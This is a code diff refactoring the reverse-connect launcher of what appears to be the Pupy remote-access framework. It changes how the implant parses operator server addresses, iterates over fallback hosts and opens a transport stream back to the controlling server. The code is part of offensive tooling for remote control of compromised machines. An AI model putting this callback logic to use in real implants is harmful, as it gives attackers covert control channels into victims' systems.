@@ -14,20 +14,31 @@ class ConnectLauncher(BaseLauncher):
         super(ConnectLauncher, self).__init__(*args, **kwargs)
     def init_argparse(self):
         self.arg_parser = LauncherArgumentParser(prog="connect", description=self.__doc__)
-        self.arg_parser.add_argument('--host', metavar='<host:port>', required=True, help='host:port of the pupy server to connect to. Add redundant servers with additional --host entries`', action='append')
+        self.arg_parser.add_argument('--host', metavar='<host:port>', required=True, action='append', help='host:port of the pupy server to connect to. You can provide multiple --host arguments to attempt to connect to multiple IPs')
         self.arg_parser.add_argument('-t', '--transport', choices=[x for x in network.conf.transports.iterkeys()], default="ssl", help="the transport to use ! (the server needs to be configured with the same transport) ")
         self.arg_parser.add_argument('transport_args', nargs=argparse.REMAINDER, help="change some transport arguments ex: param1=value param2=value ...")
+
     def parse_args(self, args):
-        self.args = self.arg_parser.parse_args(args)
-        self.rhost, self.rport = None, None
+        self.args=self.arg_parser.parse_args(args)
+        self.rhost, self.rport=None,None
+        self.parse_host(self.args.host[0])
+    
+    def parse_host(self, host):
+        tab=host.rsplit(":",1)
+        self.rhost=tab[0]
+        if len(tab)==2:
+            self.rport=int(tab[1])
+        else:
+            self.rport=443
+        self.set_host("%s:%s"%(self.rhost, self.rport))
         self.set_transport(self.args.transport)
+
     def iterate(self):
-        for server in self.args.host:
-            count = 0
-            #try a server host 3 times before moving onto the next
-            while count <3:
-                if self.args is None:
-                    raise LauncherError("parse_args needs to be called before iterate")
+        if self.args is None:
+            raise LauncherError("parse_args needs to be called before iterate")
+        for current_host in self.args.host:
+            self.parse_host(current_host)
+            try:
                 logging.info("connecting to %s:%s using transport %s ..."%(self.rhost, self.rport, self.args.transport))
                 opt_args=utils.parse_transports_args(' '.join(self.args.transport_args))
                 t=network.conf.transports[self.args.transport](bind_payload=self.connect_on_bind_payload)
@@ -52,17 +63,9 @@ class ConnectLauncher(BaseLauncher):
                     client=t.client(**client_args)
                 except Exception as e:
                     raise SystemExit(e)
-
-                try:
-                    host= server.rsplit(":", 1)
-                    self.rhost = host[0]
-                    if len(host) == 2:
-                        self.rport = host[1]
-                    else:
-                        self.rport = 443
-                    self.set_host("%s:%s" % (self.rhost, self.rport))
-                    s=client.connect(self.rhost, self.rport)
-                    stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
-                    yield stream
-                except Exception as e:
-                    count+=1
+                s=client.connect(self.rhost, self.rport)
+                stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
+                yield stream
+            except Exception as e:
+                logging.info(e)
+                    
